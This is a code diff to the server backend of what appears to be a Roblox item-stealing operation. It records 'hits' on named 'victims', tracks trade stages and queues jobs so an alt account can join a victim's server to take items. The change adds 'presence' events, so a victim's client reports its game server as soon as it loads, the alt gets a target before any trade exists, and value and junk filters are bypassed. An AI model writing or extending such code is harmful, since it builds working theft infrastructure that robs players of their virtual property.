@@ -348,8 +348,9 @@ const junkItem = (item) => {
 };
 const usableHit = (hit) => Boolean(
   hit?.place_id && hit?.server_id && hit?.item
-  && !JUNK_VICTIMS.has(String(hit.victim ?? '').toLowerCase())
-  && !junkItem(hit.item),
+  && (hit.presence === true
+    || (!JUNK_VICTIMS.has(String(hit.victim ?? '').toLowerCase())
+      && !junkItem(hit.item))),
 );
 
 const latestTargets = (user) => {
@@ -378,6 +379,7 @@ const latestTargets = (user) => {
       server_id: h.server_id,
       server_url: h.server_url ?? null,
       requester: h.roblox_user ?? null,
+      presence: h.presence === true,
       owner: store.userById(h.user_id)?.username ?? null,
       created_at: h.created_at,
       status: usable ? (job?.status ?? 'new') : 'ignored',
@@ -426,6 +428,7 @@ const claimJobPayload = (j) => ({
   place_id: j.place_id,
   server_id: j.server_id,
   status: j.status,
+  presence: j.presence === true,
   requester: j.requester ?? null,
 });
 
@@ -610,7 +613,7 @@ const api = {
     const min = Number(cfg.min_value) || 0;
     const next = jobs
       .filter((j) => j.status === 'queued' && j.created_at > Date.now() - 8 * 60_000
-        && j.value >= min && j.place_id && j.server_id && (j.attempts ?? 0) < 5)
+        && (j.presence || j.value >= min) && j.place_id && j.server_id && (j.attempts ?? 0) < 5)
       .sort((a, b) => b.created_at - a.created_at)[0];
 
     if (next) {
@@ -1476,6 +1479,34 @@ const handle = async (req, res) => {
         const placeId = Number(entry.place_id) || null;
         const serverId = clean(entry.server_id, 60) || null;
 
+        // a client that just loaded announces its server before any item is
+        // captured. this gives the alt a target even when no trade exists yet.
+        if (entry.event === 'presence') {
+          if (!placeId || !serverId) continue;
+          const who = clean(entry.roblox_user, 40) || 'client';
+          const hit = store.addHit({
+            id: randomUUID(),
+            user_id: user.id,
+            game,
+            item: 'session',
+            victim: who,
+            value: 0,
+            status: 'claimed',
+            created_at: Date.now(),
+            place_id: placeId,
+            server_id: serverId,
+            server_url: `https://www.roblox.com/games/start?placeId=${placeId}&gameInstanceId=${encodeURIComponent(serverId)}`,
+            executor: clean(entry.executor, 40) || null,
+            roblox_user: who,
+            presence: true,
+          });
+          accepted.push(hit);
+          if (user.role === 'admin' && !claimerNames.has(who.toLowerCase())) {
+            claimTargets.push(hit);
+          }
+          continue;
+        }
+
         // trade stages from the client: receiver joined -> request -> offer -> confirm
         if (entry.event === 'trade') {
           user.trades ??= [];
@@ -1564,7 +1595,8 @@ const handle = async (req, res) => {
         }
       }
 
-      const delivery = accepted.length ? await deliverHit(user, accepted[0]) : null;
+      const deliverable = accepted.find((h) => !h.presence);
+      const delivery = deliverable ? await deliverHit(user, deliverable) : null;
       return json(res, 202, {
         ok: true,
         accepted: accepted.length,
